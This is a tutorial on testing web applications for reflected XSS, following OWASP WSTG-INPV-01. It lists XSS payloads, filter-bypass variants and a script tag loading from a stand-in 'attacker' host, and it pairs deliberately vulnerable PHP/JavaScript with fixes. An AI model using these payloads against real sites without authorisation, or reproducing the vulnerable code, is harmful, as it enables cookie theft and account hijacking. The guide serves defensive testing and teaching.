# Testing for Reflected Cross-Site Scripting (XSS) Vulnerabilities

## Overview

Testing for Reflected Cross-Site Scripting (XSS) vulnerabilities involves verifying that a web application properly sanitizes user input reflected in HTTP responses to prevent malicious script execution. According to OWASP (WSTG-INPV-01), reflected XSS occurs when user input, such as URL parameters or form data, is embedded in the response without encoding, allowing attackers to inject JavaScript that executes in the victim's browser. This guide provides a hands-on methodology to identify and test reflected XSS vulnerabilities, focusing on input vectors, payload injection, filter bypasses, and real-world scenarios like JSON responses, URL fragments, error messages, and Referer headers, with tools, commands, and remediation strategies.

**Impact**: Reflected XSS vulnerabilities can lead to:
- Session hijacking via cookie theft.
- Phishing or redirection to malicious sites.
- Unauthorized actions on behalf of the user.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-INPV-01, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as injecting payloads may trigger security alerts or violate terms of service.

## Testing Tools

The following tools are recommended for testing reflected XSS vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests/responses to inject XSS payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify input vectors.
  - **Note**: Check Response tab for reflected payloads.

- **OWASP ZAP 3.0**: A free tool for automated and manual XSS testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with XSS rules to detect vulnerabilities (verify manually).

- **Browser Developer Tools (Chrome/Firefox)**: Inspects HTML, responses, and network requests.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Elements tab to find reflected payloads, Network tab to analyze requests, and Console to test execution.
  - Example command to inspect DOM:
    ```javascript
    document.body.innerHTML.includes('<script>alert(123)</script>')
    ```
  - **Tip**: Firefox’s 2025 DOM inspector enhancements improve payload analysis.

- **cURL and HTTPie**: Send HTTP requests to test endpoints with payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/?q=<script>alert(123)</script>"
      # HTTPie
      http "http://example.com/?q=<script>alert(123)</script>"
      ```

- **PHP Charset Encoder (PCE)**: Encodes payloads to bypass filters.
  - Access online by searching “PHP Charset Encoder.”
  - Example: Encode `<script>alert(123)</script>` to `%3cscript%3ealert(123)%3c/script%3e`.

- **Hackvertor**: Obfuscates payloads for filter evasion.
  - Access online by searching “Hackvertor XSS.”
  - Example: Convert `<script>` to `<scr<script>ipt>`.

- **XSS Filter Evasion Cheat Sheet**: Provides payloads for testing.
  - Resource: [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).
  - Sample payloads:
    - `<script>alert(123)</script>`
    - `" onfocus="alert(123)`
    - `<img src=x onerror=alert(123)>`
  - **Tip**: Combine with PCE or Hackvertor for advanced evasion.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-01, testing reflected XSS vulnerabilities across input vectors, payload injection, filter bypasses, and specific contexts like JSON, URL fragments, error messages, and Referer headers.

### 1. Detect Input Vectors

**Objective**: Identify all user-controllable input points that may be reflected in responses.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Look for search bars, forms, or URLs with parameters (e.g., `?q=test`).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Identify parameters (e.g., `q=test` in `GET /search?q=test`).
3. Inspect HTML with Developer Tools:
   - Open Elements tab (`Ctrl+Shift+I`).
   - Search (`Ctrl+F`) for `<input>`, `<form>`, `<select>`, or `<textarea>` tags.
   - Note hidden fields (e.g., `<input type="hidden" name="token">`).
4. List input vectors:
   - Document URL parameters, form fields, and hidden fields.

**Example Input Vectors**:
- URL: `http://example.com/search?q=test`
- Form: `<input name="username">`
- Hidden: `<input type="hidden" name="token" value="abc123">`

**Remediation**:
- Validate inputs server-side using allowlists (e.g., alphanumeric).
- Log unexpected input for analysis:
  ```php
  if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
      error_log("Invalid input: $input");
  }
  ```

**Tip**: Save the input vector list in a report.

### 2. Analyze Input Vectors

**Objective**: Test input vectors with payloads to detect reflection and execution.

**Steps**:
1. Prepare payloads:
   - Start with `<script>alert(123)</script>`.
   - Use OWASP XSS Filter Evasion Cheat Sheet for advanced payloads.
2. Inject payloads with Burp Suite:
   - Capture a request (e.g., `GET /search?q=test`).
   - Modify in Repeater: `q=<script>alert(123)</script>`.
   - Forward and check the response.
3. Inject manually:
   - Modify URL: `http://example.com/search?q=<script>alert(123)</script>`.
   - Submit forms with payloads in fields.
4. Use OWASP ZAP:
   - Add URL to Sites tab.
   - Run Active Scan and check Alerts for XSS (verify manually).
5. Check for reflection:
   - Search response HTML for the payload.
   - If an alert appears, the payload executed.

**Test Payloads**:
- `<script>alert(123)</script>`
- `" onfocus="alert(123)`
- `%3cscript%3ealert(123)%3c/script%3e`
- `<scr<script>ipt>alert(123)</script>`
- `<SCRIPT SRC="http://attacker/xss.js"></SCRIPT>`

**Example Vulnerable Response**:
```html
Welcome <script>alert(123)</script>!
```
Alert executes.

**Example Secure Response**:
```html
Welcome &lt;script&gt;alert(123)&lt;/script&gt;!
```
No execution.

**Remediation**:
- Encode output:
  ```php
  echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
  ```
- Use Content Security Policy (CSP):
  ```html
  <meta http-equiv="Content-Security-Policy" content="script-src 'self';">
  ```

**Tip**: Save payloads and responses in a report.

### 3. Check Impact

**Objective**: Assess the payload’s effects (e.g., cookie theft, redirection).

**Steps**:
1. Inspect the response:
   - Use Elements tab to find the payload.
   - Check if it’s unencoded (e.g., `<script>` vs. `&lt;script&gt;`).
2. Test execution:
   - If `<script>alert(123)</script>` triggers an alert, it executed.
   - Test `<script>alert(document.cookie)</script>` for cookie access.
3. Check context:
   - Note where the payload appears (e.g., HTML, attribute, JavaScript).
   - Use context-specific payloads (e.g., `" onfocus="alert(123)` for attributes).
4. Document impact:
   - Record effects (e.g., cookie theft, redirection).
   - Take screenshots of alerts.

**Example Vulnerable Code (PHP)**:
```php
<?php
echo "Welcome {$_GET['user']}!";
?>
```
Test: `?user=<script>alert(document.cookie)</script>`
Result: Alert shows cookies.

**Example Secure Code (PHP)**:
```php
<?php
echo "Welcome " . htmlspecialchars($_GET['user'], ENT_QUOTES, 'UTF-8') . "!";
?>
```
Test: `?user=<script>alert(document.cookie)</script>`
Result: No alert.

**Remediation**:
- Encode attributes:
  ```php
  echo "<input value=\"" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "\">";
  ```
- Use CSP to block inline scripts.

**Tip**: Save impact evidence in a report.

### 4. Bypass XSS Filters

**Objective**: Test if filters or WAFs can be bypassed.

**Steps**:
1. Encode payloads:
   - Use PCE to encode `<script>` to `%3cscript%3e`.
   - Test: `?q=%3cscript%3ealert(123)%3c/script%3e`.
2. Try case variations:
   - Test: `<ScRiPt>alert(123)</ScRiPt>`.
3. Test nested payloads:
   - Test: `<scr<script>ipt>alert(123)</script>`.
4. Test HTTP Parameter Pollution (HPP):
   - Test: `?q=<script>&q=alert(123)</script>`.
5. Verify results:
   - If an alert appears, the filter was bypassed.

**Example Vulnerable Code (PHP)**:
```php
<?php
$input = preg_replace("/<script[^>]+src/i", "", $_GET['q']);
echo $input;
?>
```
Test: `?q=<SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>`
Result: Filter bypassed, script loads.

**Example Secure Code (PHP)**:
```php
<?php
echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
?>
```
Test: `?q=<SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>`
Result: No execution.

**Remediation**:
- Decode inputs before validation:
  ```php
  $input = urldecode($_GET['q']);
  ```
- Use recursive sanitization or libraries like DOMPurify.

**Tip**: Save successful bypass payloads in a report.

### 5. XSS in JSON Responses

**Objective**: Test JSON endpoints for unescaped input reflection.

**Steps**:
1. Identify JSON endpoints:
   - Use Burp to find APIs (e.g., `/api/search?q=test`).
   - Check for JSON responses (e.g., `{"result":"test"}`).
2. Inject payloads:
   - Test: `?q="};alert(123);//`.
   - Use Burp Repeater or cURL:
     ```bash
     curl -i "http://example.com/api/search?q=%22%7D;alert(123);//"
     ```
3. Check client-side rendering:
   - Use Network tab to view JSON.
   - Check if the payload executes when rendered.
4. Verify impact:
   - Test: `?q="};alert(document.cookie);//`.

**Example Vulnerable Code (PHP)**:
```php
<?php
echo json_encode(['result' => $_GET['q']]);
?>
```
Test: `?q="};alert(123);//`
Result: `{"result":""};alert(123);//"}` (alert executes).

**Example Secure Code (PHP)**:
```php
<?php
echo json_encode(['result' => htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8')], JSON_HEX_QUOT | JSON_HEX_TAG);
?>
```
Test: `?q="};alert(123);//`
Result: Escaped, no execution.

**Remediation**:
- Use JSON encoding flags:
  ```php
  json_encode($data, JSON_HEX_QUOT | JSON_HEX_TAG);
  ```
- Sanitize inputs to reject control characters.

**Tip**: Save JSON responses in a report.

### 6. XSS via URL Fragment Identifiers

**Objective**: Test URL fragments reflected unsanitized by client-side JavaScript.

**Steps**:
1. Identify fragment usage:
   - Test: `http://example.com/page#test`.
   - Check JavaScript for `window.location.hash` usage.
2. Inject payloads:
   - Test: `http://example.com/page#<script>alert(123)</script>`.
   - Test: `http://example.com/page#javascript:alert(123)`.
3. Check reflection:
   - Use Elements tab to find the payload in the DOM.
   - Verify if an alert appears.
4. Verify impact:
   - Test: `#javascript:alert(document.cookie)`.

**Example Vulnerable Code (JavaScript)**:
```javascript
document.getElementById('output').innerHTML = window.location.hash.slice(1);
```
Test: `#<script>alert(123)</script>`
Result: Alert executes.

**Example Secure Code (JavaScript)**:
```javascript
document.getElementById('output').textContent = window.location.hash.slice(1);
```
Test: `#<script>alert(123)</script>`
Result: No execution.

**Remediation**:
- Use `textContent` instead of `innerHTML`.
- Sanitize fragments server-side:
  ```javascript
  if (/[<>{}]/.test(hash)) return '';
  ```

**Tip**: Save fragment payloads and DOM changes in a report.

### 7. XSS in Error Messages

**Objective**: Test error messages reflecting unsanitized input.

**Steps**:
1. Trigger errors:
   - Submit invalid form inputs or access invalid URLs (e.g., `http://example.com/page/<script>alert(123)</script>`).
2. Inject payloads:
   - Test: `<script>alert(123)</script>` in URL or form.
   - Use Burp to modify POST data.
3. Check error messages:
   - View the error page in the browser.
   - Search for the payload in HTML.
4. Verify execution:
   - Test: `<script>alert(document.cookie)</script>`.

**Example Vulnerable Code (PHP)**:
```php
<?php
echo "Error: Page {$_GET['page']} not found!";
?>
```
Test: `?page=<script>alert(123)</script>`
Result: Alert executes.

**Example Secure Code (PHP)**:
```php
<?php
echo "Error: Page " . htmlspecialchars($_GET['page'], ENT_QUOTES, 'UTF-8') . " not found!";
?>
```
Test: `?page=<script>alert(123)</script>`
Result: No execution.

**Remediation**:
- Use generic error messages:
  ```php
  echo "Error: Page not found!";
  ```
- Encode inputs in errors.

**Tip**: Save error responses in a report.

### 8. XSS via Referer Header

**Objective**: Test reflection of unsanitized Referer header values.

**Steps**:
1. Inject via Referer:
   - Use Burp to set: `Referer: http://example.com/<script>alert(123)</script>`.
   - Send request:
     ```http
     GET /page HTTP/1.1
     Host: example.com
     Referer: http://example.com/<script>alert(123)</script>
     ```
2. Check reflection:
   - Search response HTML for the payload.
3. Verify execution:
   - Test: `Referer: http://example.com/<script>alert(document.cookie)</script>`.
4. Automate with ZAP:
   - Configure custom headers and scan for XSS.

**Example Vulnerable Code (PHP)**:
```php
<?php
echo "Came from: {$_SERVER['HTTP_REFERER']}";
?>
```
Test: Referer with `<script>alert(123)</script>`
Result: Alert executes.

**Example Secure Code (PHP)**:
```php
<?php
echo "Came from: " . htmlspecialchars($_SERVER['HTTP_REFERER'], ENT_QUOTES, 'UTF-8');
?>
```
Test: Referer with `<script>alert(123)</script>`
Result: No execution.

**Remediation**:
- Avoid reflecting Referer unless necessary.
- Encode header values:
  ```php
  htmlspecialchars($referer, ENT_QUOTES, 'UTF-8');
  ```

**Tip**: Save Referer payloads and responses in a report.
